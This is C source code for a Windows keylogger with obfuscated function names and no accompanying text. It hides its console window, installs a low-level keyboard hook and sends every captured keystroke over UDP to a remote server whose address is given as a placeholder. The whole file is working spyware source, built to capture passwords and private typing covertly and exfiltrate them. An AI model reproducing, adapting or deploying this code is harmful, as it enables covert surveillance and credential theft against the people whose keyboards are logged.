#include <winsock2.h> #include <windows.h> #include <conio.h> #include <stdio.h> #include <stdlib.h> #include <time.h> #include <string.h> #define DEFAULT_PORT 8080 #define SERVER_ADDR "xxx.xxx.xxx.xxx" typedef struct _MYHOOKDATA { int nType; HOOKPROC hkprc; HHOOK hhook; } MYHOOKDATA; MYHOOKDATA kb_hook; UINT map_key; BOOL Continue = TRUE; WSADATA wsaData; SOCKET SendingSocket; SOCKADDR_IN ReceiverAddr; int Ret; LRESULT WINAPI rgdvdthtf(int, WPARAM, LPARAM); void gsdrvlgjrvqjmjvgrg(void); void fkdkdcosel(char *buf); void fsilrlndsgvktd(WSADATA wsaData, SOCKET s, SOCKADDR_IN r_addr, int ret); int main(int argc, char **argv) { gsdrvlgjrvqjmjvgrg(); time_t now = time(NULL); MSG msg; kb_hook.nType = WH_KEYBOARD_LL; kb_hook.hkprc = rgdvdthtf; kb_hook.hhook = SetWindowsHookEx(kb_hook.nType, kb_hook.hkprc, (HINSTANCE)NULL, 0); if ((Ret = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0) { return 1; } if ((SendingSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == INVALID_SOCKET) { WSACleanup(); return 1; } ReceiverAddr.sin_family = AF_INET; ReceiverAddr.sin_port = htons(DEFAULT_PORT); ReceiverAddr.sin_addr.s_addr = inet_addr(SERVER_ADDR); char *temp = malloc(50); fkdkdcosel(temp); free(temp); while (GetMessage(&msg, NULL, 0, 0) != 0) { TranslateMessage(&msg); DispatchMessageW(&msg); } if (kb_hook.hhook) UnhookWindowsHookEx(kb_hook.hhook); closesocket(SendingSocket); WSACleanup(); return 1; } void fkdkdcosel(char *str) { int len = strlen(str); if ((Ret = sendto(SendingSocket, str, len + 1, 0, (SOCKADDR *)&ReceiverAddr, sizeof(ReceiverAddr))) == SOCKET_ERROR) { closesocket(SendingSocket); WSACleanup(); return; } } LRESULT WINAPI rgdvdthtf(int nCode, WPARAM wParam, LPARAM lParam) { PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam; char *buffer = malloc(12); memset(buffer, ' ', 12); if (nCode < 0) return CallNextHookEx(kb_hook.hhook, nCode, wParam, lParam); if (nCode == HC_ACTION && wParam == WM_KEYDOWN) { map_key = MapVirtualKeyExW(key->vkCode, MAPVK_VK_TO_CHAR, GetKeyboardLayout(LANG_SYSTEM_DEFAULT)); switch (map_key) { case VK_RETURN: strcpy(buffer, "[ENTER]"); break; case VK_ESCAPE: strcpy(buffer, "[ESC]"); break; case VK_SPACE: strcpy(buffer, "[SPACE]"); break; case 0x51: PostQuitMessage(0); default: sprintf(buffer, "%c", map_key); } fkdkdcosel(buffer); } memset(buffer, 0, 12); free(buffer); return CallNextHookEx(kb_hook.hhook, nCode, wParam, lParam); } void gsdrvlgjrvqjmjvgrg() { HWND window; AllocConsole(); window = FindWindowA("ConsoleWindowClass", NULL); ShowWindow(window, 0); }
